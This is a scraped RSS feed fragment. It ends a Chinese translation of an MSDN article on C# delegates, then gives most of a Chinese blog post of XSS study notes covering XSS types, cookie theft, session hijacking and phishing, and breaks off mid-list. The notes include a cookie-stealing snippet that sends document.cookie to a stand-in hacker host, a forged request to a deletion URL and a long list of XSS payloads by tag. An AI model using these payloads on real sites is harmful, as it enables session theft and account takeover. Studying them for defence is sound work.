-&lt;p&gt;若要研究 Actions 类的实现，请务必下载 Lizzie 版本 0.1，因为我在后面推出的版本中完全重写了代码，使之成为独立编程语言。&lt;/p&gt;
-&lt;h2&gt;C# 中的函数式编程&lt;/h2&gt;
-&lt;p&gt;大多数开发人员往往认为，C# 几乎与面向对象的编程 (OOP) 同义或至少密切相关，事实显然如此。不过，通过重新思考如何使用 C#，并深入了解它的各方面功能，解决一些问题就变得更加简单了。目前形式的 OOP 不太易于重用，原因很多是因为它是强类型。&lt;/p&gt;
-&lt;p&gt;例如，如果重用一个类，就不得不重用初始类引用的每个类（在两种情况下，类都是通过组合和继承进行使用）。此外，类重用还会强制重用这些第三方类引用的所有类等。如果这些类是在不同的程序集中实现，必须添加各种各样的程序集，才能获得对一个类型上单个方法的访问权限。&lt;/p&gt;
-&lt;p&gt;我曾经看过一个可以说明这个问题的类比：“虽然想要的是香蕉，但最终得到的是手拿香蕉的大猩猩，以及大猩猩所居住的热带雨林。” 将这种情况与使用更动态的语言（如 JavaScript）进行重用做比较，后者并不关心类型，只要它实现函数本身使用的函数即可。通过略微宽松类型方法生成的代码更灵活、更易于重用。委托可以实现这一点。&lt;/p&gt;
-&lt;p&gt;可使用 C# 来改善跨多个项目重用代码的过程。只需要理解函数或委托也可以是对象，并且可以通过弱类型方式控制这些对象的集合。&lt;/p&gt;
-&lt;p&gt;早在 2018 年 11 月发行的《MSDN 杂志》中，我发表过一篇标题为“使用符号委托创建你自己的脚本语言”的文章 (&lt;a href=&quot;http://msdn.com/magazine/mt830373&quot;&gt;msdn.com/magazine/mt830373&lt;/a&gt;)。本文中提到的有关委托的思路是在这篇文章的基础之上形成。本文还介绍了 Lizzie，这是我的自制脚本语言，它的存在归功于这种以委托为中心的思维模式。如果我使用 OOP 规则创建了 Lizzie，我会认为，它在大小上可能至少大一个数量级。&lt;/p&gt;
-&lt;p&gt;当然，如今 OOP 和强类型处于主导地位，想要找到一个主要必需技能不要求它的职位描述，几乎是不可能的。我在此郑重声明，我创建 OOP 代码的时间已超过 25 年，所以，我与任何人一样都会因为对强类型有偏见而感到内疚。然而，如今我在编码方法上更加务实，对类层次结构的最终外观失去兴趣。&lt;/p&gt;
-&lt;p&gt;并不是我不欣赏外观精美的类层次结构，而是收益递减。添加到层次结构中的类越多，它就变得越臃肿，直到因不堪重压而崩溃。有时，卓越的设计只用很少的方法、更少的类和大多数松散耦合的函数，这样就可以轻松扩展代码，也就不需要“引入大猩猩和热带雨林”了。&lt;/p&gt;
-&lt;p&gt;回到本文反复出现的主题（从 Miles Davis 的音乐方法中获得灵感）：少即是多（“没有声音比有声音更重要”）。 代码也不例外。间断代码行往往会产生奇迹，最佳解决方案的衡量依据更多是不编码什么，而不是编码什么。连傻瓜也可以将喇叭吹响，但只有为数不多的人才能用喇叭吹奏出音乐。像 Miles 这样能创造出奇迹的人就更少了。&lt;/p&gt;
-
-&lt;hr/&gt;&lt;p&gt; 原文作者：Thomas Hansen&lt;/p&gt;
-&lt;p&gt;原文地址：&lt;a title=&quot;Minimize Complexity in Multithreaded C# Code&quot; href=&quot;https://msdn.microsoft.com/zh-cn/magazine/mt833270&quot; target=&quot;_blank&quot;&gt;Minimize Complexity in Multithreaded C# Code&lt;/a&gt;&lt;a href=&quot;http://csharpindepth.com/Articles/General/Singleton.aspx#performance&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 14:34:00 +0000</pubDate>
-<dc:creator>楚人Leo</dc:creator>
-<og:description>分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/leolion/p/10581723.html</dc:identifier>
-</item>
-<item>
-<title>前端Hack之XSS攻击个人学习笔记 - Yunen的博客</title>
-<link>http://www.cnblogs.com/yunen/p/10581320.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/yunen/p/10581320.html</guid>
-<description>&lt;p&gt;**&lt;br/&gt;       此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)&lt;br/&gt;**&lt;br/&gt;&lt;/p&gt;
-&lt;h2 id=&quot;什么是xss&quot;&gt;1) 什么是XSS?&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       如果对以上描述还不是很了解的话，可以参考&lt;a href=&quot;https://baike.baidu.com/item/xss/917356&quot;&gt;百度百科&lt;/a&gt;&lt;br/&gt;       在&lt;strong&gt;余弦大大&lt;/strong&gt;和&lt;strong&gt;xisigr大大&lt;/strong&gt;的书籍《Web前端安全技术揭秘》第三章中这样说道：&lt;/p&gt;
-&lt;blockquote readability=&quot;7&quot;&gt;
-&lt;p&gt;跨站脚本的重点不在“跨站”上，而应该在“脚本”上...因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;       确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。&lt;/p&gt;
-&lt;h2 id=&quot;xss可以带来哪些危害&quot;&gt;2) XSS可以带来哪些危害？&lt;/h2&gt;
-&lt;p&gt;       对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;网页挂马;&lt;/li&gt;
-&lt;li&gt;盗取Cookie;&lt;/li&gt;
-&lt;li&gt;DoS攻击;&lt;/li&gt;
-&lt;li&gt;钓鱼攻击;&lt;/li&gt;
-&lt;li&gt;蠕虫攻击;&lt;/li&gt;
-&lt;li&gt;劫持用户web行为;&lt;/li&gt;
-&lt;li&gt;结合CSRF进行针对性攻击;&lt;/li&gt;
-&lt;li&gt;······&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;这些都是可以利用XSS漏洞来达成的。&lt;/p&gt;
-&lt;h2 id=&quot;xss类型&quot;&gt;3) XSS类型&lt;/h2&gt;
-&lt;p&gt;目前的XSS总共可以分为三种类型：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;反射型(也叫非持久型)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;存储型(也叫持久型)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;DOM型&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)&lt;/p&gt;
-&lt;h3 id=&quot;反射型xss&quot;&gt;反射型XSS&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       由于篇幅问题，关于反射型XSS我就不做过多简述。&lt;br/&gt;       有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：&lt;a href=&quot;https://xz.aliyun.com/t/3919&quot;&gt;记一次从DOM型XSS到RCE过程&lt;/a&gt;。&lt;/p&gt;
-&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;
-&lt;p&gt;       &lt;strong&gt;存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。--- 《XSS跨站脚本攻击剖析与防御》&lt;/strong&gt;&lt;br/&gt;       存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。---《Web前端黑客技术揭秘》&lt;/p&gt;
-&lt;h3 id=&quot;dom型xss&quot;&gt;DOM型XSS&lt;/h3&gt;
-&lt;p&gt;       &lt;strong&gt;许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识&lt;br/&gt;       DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在&lt;a href=&quot;https://baike.baidu.com/item/DOM/50288&quot;&gt;百度百科&lt;/a&gt;得到相应的解答。&lt;/strong&gt;&lt;br/&gt;       DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。&lt;br/&gt;       在&lt;strong&gt;刺&lt;/strong&gt;的《白帽子讲Web安全》是这样讲的：&lt;/p&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;       举个简单的例子(来自《Web前端黑客技术揭秘》)：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;html&amp;gt;
-...
-&amp;lt;script&amp;gt;
-var a=document.URL;
-document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));
-&amp;lt;/script&amp;gt;
-...
-&amp;lt;/html&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       把以上代码保存为1.html,然后打开浏览器访问&lt;code&gt;http://127.0.0.1/1.html#a=test&lt;/code&gt;&lt;br/&gt;       我们知道这是个静态页面，而且#后边的内容并不会传给服务器。&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2019/03/09/5c839d5c04d33.png&quot; alt=&quot;访问结果&quot;/&gt;&lt;br/&gt;       可是这样就不会产生XSS漏洞了吗？如果我们访问&lt;br/&gt;&lt;code&gt;http://127.0.0.1/.html#a=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br/&gt;       当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。&lt;br/&gt;       具体执行过程如图：&lt;img src=&quot;https://i.loli.net/2019/03/09/5c83cca814d51.jpg&quot; alt=&quot;来自《黑客攻防技术宝典Web实战篇》&quot;/&gt;&lt;/p&gt;
-&lt;h2 id=&quot;xss的利用方式&quot;&gt;4) XSS的利用方式&lt;/h2&gt;
-&lt;p&gt;       前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。&lt;/p&gt;
-&lt;h3 id=&quot;cookie窃取&quot;&gt;Cookie窃取&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;       Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;会弹出当前页面的cookie信息。&lt;/strong&gt;&lt;/p&gt;
-&lt;hr/&gt;&lt;p&gt;       这里我们引入一个叫做“同源策略”的概念：&lt;/p&gt;
-&lt;blockquote readability=&quot;9&quot;&gt;
-&lt;p&gt;首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面&lt;code&gt;http://www.a.com/index.html&lt;/code&gt;，域名是 &lt;code&gt;www.a.com&lt;/code&gt;，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：&lt;img src=&quot;https://i.loli.net/2019/03/10/5c84907479e30.jpg&quot;/&gt;&lt;br/&gt;       同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。&lt;br/&gt;       除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：&lt;br/&gt;       (1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB&lt;br/&gt;       (2) 无法读写非同源网页的 DOM&lt;br/&gt;       (3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;       ————引自&lt;strong&gt;晚风&lt;/strong&gt;表哥在信安之路上的投稿文章&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;amp;mid=2247487543&amp;amp;idx=1&amp;amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=#rd&quot;&gt;《同源策略与跨域请求》&lt;/a&gt;&lt;/p&gt;
-&lt;hr/&gt;&lt;p&gt;       我们知道Cookie有如下常见的属性：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Domain————设置关联Cookie的域名;&lt;/li&gt;
-&lt;li&gt;Expires————通过给定一个过期时间来创建一个持久化Cookie;&lt;/li&gt;
-&lt;li&gt;Httponly————用于避免Cookie被Javascript访问;&lt;/li&gt;
-&lt;li&gt;Name————Cookie的名称;&lt;/li&gt;
-&lt;li&gt;Path————关联到Cookie的路径，默认为/;&lt;/li&gt;
-&lt;li&gt;Value————读写Cookie的值;&lt;/li&gt;
-&lt;li&gt;Secure————用于指定Cookie需要通过安全Socket层传递连接;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;       并且Cookie也可以安装类型分为：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;&lt;/li&gt;
-&lt;li&gt;内存Cookie————即储存在内存中，随浏览器的关闭而消失;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;       如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。&lt;br/&gt;       由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况&lt;/p&gt;
-&lt;h4 id=&quot;默认&quot;&gt;默认&lt;/h4&gt;
-&lt;p&gt;       默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;script&amp;gt;
-new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;
-&amp;lt;/script&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;h4 id=&quot;不同域&quot;&gt;不同域&lt;/h4&gt;
-&lt;p&gt;       这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为&lt;strong&gt;本域&lt;/strong&gt;。&lt;br/&gt;       例如有两个网站&lt;code&gt;www.a.com&lt;/code&gt;和&lt;code&gt;test.a.com&lt;/code&gt;且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从&lt;code&gt;test.a.com&lt;/code&gt;获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie，可是如果&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值中的domain属性设置为父级域即&lt;code&gt;a.com&lt;/code&gt;，就可以通过&lt;code&gt;test.a.com&lt;/code&gt;的xss漏洞获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值。&lt;/p&gt;
-&lt;h4 id=&quot;不同路径&quot;&gt;不同路径&lt;/h4&gt;
-&lt;p&gt;       这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在&lt;code&gt;www.a.com/admin/index.php&lt;/code&gt;设置cookie值且不知道path，那么path默认为&lt;code&gt;/admin/&lt;/code&gt;。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有&lt;code&gt;/admin/&lt;/code&gt;目录下的javascipt才能读取前边设置的Cookie。&lt;/p&gt;
-&lt;h4 id=&quot;http-only&quot;&gt;Http Only&lt;/h4&gt;
-&lt;p&gt;       HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。&lt;/li&gt;
-&lt;li&gt;利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)&lt;/p&gt;
-&lt;h4 id=&quot;secure&quot;&gt;Secure&lt;/h4&gt;
-&lt;p&gt;       Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。&lt;/p&gt;
-&lt;h4 id=&quot;p3p&quot;&gt;P3P&lt;/h4&gt;
-&lt;p&gt;       HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。&lt;br/&gt;       我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。&lt;/p&gt;
-&lt;h5 id=&quot;b域设置a域cookie&quot;&gt;B域设置A域Cookie&lt;/h5&gt;
-&lt;p&gt;       在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。&lt;/p&gt;
-&lt;h5 id=&quot;加载b域时cookie传入问题&quot;&gt;加载B域时Cookie传入问题&lt;/h5&gt;
-&lt;p&gt;       我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。&lt;/p&gt;
-&lt;h3 id=&quot;会话劫持&quot;&gt;会话劫持&lt;/h3&gt;
-&lt;p&gt;       由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。&lt;br/&gt;       这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容&lt;/p&gt;
-&lt;blockquote readability=&quot;8&quot;&gt;
-&lt;p&gt;       Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。&lt;br/&gt;       在Session机制中，客户端和服务端也有被其他人利用的可能。&lt;br/&gt;       Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;       这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。&lt;br/&gt;       会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;通过javascript控制DOM对象来发起一个GET请求，如：&lt;/li&gt;
-&lt;/ul&gt;&lt;pre&gt;
-&lt;code&gt;var img = document.creatElement(&quot;img&quot;);
-img.src = &quot;http://www.a.com/del.php?id=1&quot;;
-document.body.appendChild(img);&lt;/code&gt;
-&lt;/pre&gt;
-&lt;ul&gt;&lt;li&gt;通过javascript自动构造隐藏表单并提交(POST)&lt;/li&gt;
-&lt;li&gt;通过XMLHttpRequest直接发送一个POST请求&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;       我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。&lt;/p&gt;
-&lt;h3 id=&quot;钓鱼&quot;&gt;钓鱼&lt;/h3&gt;
-&lt;p&gt;       现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？&lt;/p&gt;
-&lt;h4 id=&quot;xss重定向钓鱼&quot;&gt;XSS重定向钓鱼&lt;/h4&gt;
-&lt;p&gt;       即从&lt;code&gt;www.a.com&lt;/code&gt;通过xss漏洞跳转到&lt;code&gt;www.b.com&lt;/code&gt;的钓鱼页面上，整个过程变化明显，受害者易察觉。&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;http://www.a.com/index.php?search=&amp;lt;script&amp;gt;document.location.href=&quot;http://www.b.com/index.php&quot;&amp;lt;/script&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;h4 id=&quot;html注入式钓鱼&quot;&gt;HTML注入式钓鱼&lt;/h4&gt;
-&lt;p&gt;       通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。&lt;/p&gt;
-&lt;h4 id=&quot;iframe&quot;&gt;Iframe&lt;/h4&gt;
-&lt;p&gt;       攻击者通过javascript来添加一个新的&lt;code&gt;&amp;lt;Iframe&amp;gt;&lt;/code&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。&lt;/p&gt;
-&lt;h2 id=&quot;xss漏洞的挖掘&quot;&gt;5) XSS漏洞的挖掘&lt;/h2&gt;
-&lt;p&gt;       就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。&lt;/p&gt;
-&lt;h3 id=&quot;白盒审计&quot;&gt;白盒审计&lt;/h3&gt;
-&lt;p&gt;       通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。&lt;/p&gt;
-&lt;blockquote readability=&quot;7&quot;&gt;
-&lt;p&gt;分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&quot;黑盒审计&quot;&gt;黑盒审计&lt;/h3&gt;
-&lt;p&gt;       这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。&lt;/p&gt;
-&lt;h4 id=&quot;手工检测&quot;&gt;手工检测&lt;/h4&gt;
-&lt;p&gt;       首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&lt;code&gt;&quot;&amp;lt;&amp;gt;&amp;amp;;/':&lt;/code&gt;等，如果连&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;都未过滤/转义，那么该输入点很可能存在XSS漏洞。&lt;br/&gt;       如果&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如&lt;br/&gt;&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=&amp;lt;?=$query?&amp;gt;&amp;gt;&lt;/code&gt;这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&amp;gt;&lt;/code&gt;。&lt;br/&gt;       一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;常见标签
-&amp;lt;img&amp;gt;标签
-利用方式1
-&amp;lt;img src=javascript:alert(&quot;xss&quot;)&amp;gt;
-&amp;lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&amp;gt;
-&amp;lt;img scr=&quot;URL&quot; style='Xss:expression(alert(/xss));'
-&amp;lt;!--CSS标记xss--&amp;gt;
-&amp;lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&amp;gt;
-XSS利用方式2
-&amp;lt;img src=&quot;x&quot; onerror=alert(1)&amp;gt;
-&amp;lt;img src=&quot;1&quot; onerror=eval(&quot;alert('xss')&quot;)&amp;gt;
-XSS利用方式3
-&amp;lt;img src=1 onmouseover=alert('xss')&amp;gt;
-&amp;lt;a&amp;gt;标签
-标准格式
-&amp;lt;a href=&quot;https://www.baidu.com&quot;&amp;gt;baidu&amp;lt;/a&amp;gt;
-XSS利用方式1
-&amp;lt;a href=&quot;javascript:alert('xss')&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
-&amp;lt;a href=javascript:eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
-&amp;lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
-XSS利用方式2
-&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
-&amp;lt;a href=&quot;&quot; onclick=alert('xss')&amp;gt;aa&amp;lt;/a&amp;gt;
-利用方式3
-&amp;lt;a href=&quot;&quot; onclick=eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
-利用方式4
-&amp;lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&amp;gt;aa&amp;lt;/a&amp;gt;
-input标签
-标准格式
-&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;
-利用方式1
-&amp;lt;input value=&quot;&quot; onclick=alert('xss') type=&quot;text&quot;&amp;gt;
-利用方式2
-&amp;lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&amp;gt;
-利用方式4
-&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
-&amp;lt;form&amp;gt;标签
-XSS利用方式1
-&amp;lt;form action=javascript:alert('xss') method=&quot;get&quot;&amp;gt;
-&amp;lt;form action=javascript:alert('xss')&amp;gt;
-XSS利用方式2
-&amp;lt;form method=post action=aa.asp? onmouseover=prompt('xss')&amp;gt;
-&amp;lt;form method=post action=aa.asp? onmouseover=alert('xss')&amp;gt;
-&amp;lt;form action=1 onmouseover=alert('xss)&amp;gt;
-XSS利用方式3
-&amp;lt;!--原code--&amp;gt;
-&amp;lt;form method=post action=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
-&amp;lt;!--base64编码--&amp;gt;
-&amp;lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
-&amp;lt;iframe&amp;gt;标签
-XSS利用方式1
-&amp;lt;iframe src=javascript:alert('xss');height=5width=1000 /&amp;gt;&amp;lt;iframe&amp;gt;
-XSS利用方式2
-&amp;lt;iframe src=&quot;data:text/html,&amp;amp;lt;script&amp;amp;gt;alert('xss')&amp;amp;lt;/script&amp;amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
-&amp;lt;!--原code--&amp;gt;
-&amp;lt;iframe src=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
-&amp;lt;!--base64编码--&amp;gt;
-&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
-XSS利用方式3
-&amp;lt;iframe src=&quot;aaa&quot; onmouseover=alert('xss') /&amp;gt;&amp;lt;iframe&amp;gt;
-XSS利用方式3
-&amp;lt;iframe src=&quot;javascript&amp;amp;colon;prompt&amp;amp;lpar;`xss`&amp;amp;rpar;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
-svg&amp;lt;&amp;gt;标签
